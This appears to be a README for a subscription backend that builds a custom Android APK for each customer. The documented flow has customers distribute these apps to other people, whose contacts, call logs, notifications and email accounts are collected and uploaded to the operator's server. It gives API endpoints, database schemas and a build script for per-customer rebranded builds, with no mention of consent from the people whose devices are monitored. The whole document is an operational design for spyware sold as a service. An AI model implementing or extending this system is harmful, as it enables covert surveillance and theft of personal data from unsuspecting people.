# DeviceSync Admin System

## Overview

The DeviceSync Admin System allows administrators to manage users, generate custom APKs, and track data collection. Each user gets a unique 5-digit alphanumeric code that is embedded in their custom APK build.

## System Architecture

```
Admin Panel → User Management → APK Build → Data Collection → Analytics
     ↓              ↓              ↓              ↓              ↓
Create User → Generate Code → Build APK → Track Data → View Reports
```

## Key Features

### 1. User Management
- **Create Users**: Admin creates users with subscription plans
- **Internal Codes**: Each user gets a unique 5-digit alphanumeric code
- **Device Limits**: Set maximum number of devices per user
- **Billing Management**: Track subscription plans and billing cycles

### 2. APK Build System
- **Custom Builds**: Generate APKs with embedded user codes
- **Build Scripts**: Automated scripts for APK generation
- **Version Control**: Track APK versions and build history
- **Package Names**: Unique package names for each user

### 3. Data Tracking
- **User Association**: All data linked to user_internal_code
- **Device Tracking**: Monitor devices per user
- **Data Analytics**: View usage statistics and reports
- **Billing Integration**: Track usage for billing purposes

## API Endpoints

### User Management

#### Create User
```http
POST /api/admin/users
Content-Type: application/json

{
  "username": "john_doe",
  "email": "john@example.com",
  "fullName": "John Doe",
  "maxDevices": 10,
  "subscriptionPlan": "basic",
  "billingCycle": "monthly",
  "adminNotes": "Customer notes"
}
```

#### Get All Users
```http
GET /api/admin/users?page=1&limit=20&search=john&status=active&plan=basic
```

#### Get User by ID
```http
GET /api/admin/users/:userId
```

#### Update User
```http
PUT /api/admin/users/:userId
Content-Type: application/json

{
  "fullName": "Updated Name",
  "maxDevices": 15
}
```

### Internal Code Management

#### Set Custom Code
```http
PUT /api/admin/users/:userId/internal-code
Content-Type: application/json

{
  "user_internal_code": "ABC12"
}
```

#### Regenerate Code
```http
PUT /api/admin/users/:userId/internal-code
Content-Type: application/json

{
  "regenerate": true
}
```

### APK Build Management

#### Get Build Info
```http
GET /api/admin/users/:userId/build-info
```

#### Initiate APK Build
```http
POST /api/admin/users/:userId/build-apk
Content-Type: application/json

{
  "version": "1.0.0",
  "buildNotes": "Build notes"
}
```

#### Generate Build Script
```http
POST /api/admin/users/:userId/generate-build-script
Content-Type: application/json

{
  "buildType": "release"
}
```

#### Get Build Status
```http
GET /api/admin/users/:userId/build-status
```

### Subscription Management

#### Update Subscription
```http
PUT /api/admin/users/:userId/subscription
Content-Type: application/json

{
  "subscriptionStatus": "active",
  "subscriptionPlan": "premium",
  "billingCycle": "quarterly",
  "maxDevices": 20
}
```

### Analytics & Reports

#### Get User Devices
```http
GET /api/admin/users/:userId/devices?page=1&limit=50
```

#### Get User Analytics
```http
GET /api/admin/users/:userId/analytics?period=30d
```

#### Get Dashboard Stats
```http
GET /api/admin/dashboard/stats
```

## Database Schema

### User Model
```javascript
{
  username: String,           // Unique username
  email: String,             // Unique email
  fullName: String,          // Full name
  user_internal_code: String, // 5-digit alphanumeric code
  maxDevices: Number,        // Device limit
  currentDevices: Number,    // Current device count
  subscriptionStatus: String, // active, inactive, suspended, expired
  subscriptionPlan: String,  // basic, premium, enterprise
  billingCycle: String,      // monthly, quarterly, yearly
  apkVersion: String,        // Current APK version
  buildStatus: String,       // pending, building, completed, failed
  totalDataRecords: Number,  // Total data records
  adminNotes: String,        // Admin notes
  isActive: Boolean,         // User status
  createdAt: Date,           // Creation timestamp
  updatedAt: Date            // Last update timestamp
}
```

### Device Model (Updated)
```javascript
{
  deviceId: String,          // Unique device ID
  androidId: String,         // Android device ID
  user_internal_code: String, // Associated user code
  deviceName: String,        // Device name
  model: String,             // Device model
  manufacturer: String,      // Device manufacturer
  androidVersion: String,    // Android version
  userName: String,          // User name
  isConnected: Boolean,      // Connection status
  lastSeen: Date,           // Last seen timestamp
  isActive: Boolean,         // Active status
  createdAt: Date,          // Creation timestamp
  updatedAt: Date           // Last update timestamp
}
```

### Data Models (Updated)
All data models (Contact, CallLog, Notification, EmailAccount) now include:
```javascript
{
  // ... existing fields ...
  user_internal_code: String, // Associated user code
  // ... existing fields ...
}
```

## Manual Process Flow

### 1. Admin Creates User
1. Admin opens admin interface
2. Fills user details (name, email, device limit, plan)
3. System auto-generates unique 5-digit code
4. User is created in database

### 2. Admin Sets/Updates Internal Code
**Option A: Use Auto-Generated Code**
- System automatically generates unique code (e.g., "X7K9M")

**Option B: Set Custom Code**
- Admin manually enters 5-character code (e.g., "ABC12")
- System validates uniqueness

**Option C: Regenerate Code**
- Admin clicks "Regenerate" button
- System generates new unique code

### 3. Admin Generates APK Build
1. Admin selects user from list
2. Clicks "Generate Build Script"
3. System creates build script with user's code
4. Admin runs script to build APK
5. APK is named: `DeviceSync_ABC12_1.0.0_release.apk`

### 4. User Distributes APK
1. User receives custom APK
2. User distributes APK to people
3. Each APK contains embedded user_internal_code
4. All data from APK is associated with user's code

### 5. Data Collection & Tracking
1. APK collects data (contacts, call logs, notifications, emails)
2. Data is sent to server with user_internal_code
3. Server stores data linked to user
4. Admin can view data per user

## Admin Interface

### Features
- **User Management**: Create, edit, delete users
- **Code Management**: Set custom codes or regenerate
- **APK Build**: Generate build scripts and initiate builds
- **Analytics**: View user statistics and data reports
- **Billing**: Track subscription plans and device usage

### Access
Open `admin_interface.html` in a web browser to access the admin panel.

## Testing

### Run API Tests
```bash
cd Backend
node test_admin_system.js
```

### Run All Tests
```bash
cd Backend
node test_all_apis.js
```

## Build Script Example

The system generates build scripts like this:

```bash
# Build Script for User: John Doe (ABC12)
# Generated on: 2025-08-02T07:30:00.000Z
# Build Type: release

# Configuration
USER_INTERNAL_CODE="ABC12"
PACKAGE_NAME="com.devicesync.abc12"
APP_NAME="John Doe's App"
VERSION_CODE="1.0.0"

# Update AndroidManifest.xml
echo "Updating AndroidManifest.xml..."
sed -i 's/package="[^"]*"/package="${PACKAGE_NAME}"/g' app/src/main/AndroidManifest.xml

# Update build.gradle
echo "Updating build.gradle..."
sed -i 's/applicationId "[^"]*"/applicationId "${PACKAGE_NAME}"/g' app/build.gradle
sed -i 's/versionName "[^"]*"/versionName "${VERSION_CODE}"/g' app/build.gradle

# Update strings.xml
echo "Updating app name..."
sed -i 's/<string name="app_name">[^<]*<\/string>/<string name="app_name">${APP_NAME}<\/string>/g' app/src/main/res/values/strings.xml

# Create user configuration file
echo "Creating user configuration..."
cat > app/src/main/assets/user_config.json << EOF
{
  "user_internal_code": "${USER_INTERNAL_CODE}",
  "username": "john_doe",
  "fullName": "John Doe",
  "subscriptionPlan": "basic",
  "maxDevices": 10,
  "features": {
    "contacts": true,
    "callLogs": true,
    "notifications": true,
    "emailAccounts": true,
    "messages": false
  }
}
EOF

# Build APK
echo "Building APK..."
./gradlew assembleRelease
APK_PATH="app/build/outputs/apk/release/app-release.apk"

# Rename APK with user code
FINAL_APK_NAME="DeviceSync_${USER_INTERNAL_CODE}_${VERSION_CODE}_release.apk"
cp "${APK_PATH}" "${FINAL_APK_NAME}"

echo "Build completed!"
echo "APK: ${FINAL_APK_NAME}"
echo "User Code: ${USER_INTERNAL_CODE}"
echo "Package: ${PACKAGE_NAME}"
```

## Benefits

1. **Unique APKs**: Each user gets a custom APK with their code
2. **Data Isolation**: All data is associated with specific users
3. **Billing Control**: Track device usage for billing
4. **Easy Management**: Simple admin interface for user management
5. **Automated Builds**: Generate build scripts automatically
6. **Analytics**: Track usage and data collection per user

## Security Considerations

1. **Code Uniqueness**: System ensures unique internal codes
2. **Data Isolation**: Data is separated by user_internal_code
3. **Access Control**: Admin-only access to user management
4. **Validation**: Input validation for all user data
5. **Audit Trail**: Track all admin actions and changes

## Future Enhancements

1. **Automated APK Builds**: Direct integration with build systems
2. **Payment Integration**: Connect with payment gateways
3. **Advanced Analytics**: More detailed reporting and insights
4. **User Portal**: Allow users to view their own data
5. **API Rate Limiting**: Implement rate limiting for API endpoints
6. **Multi-tenancy**: Support for multiple admin organizations 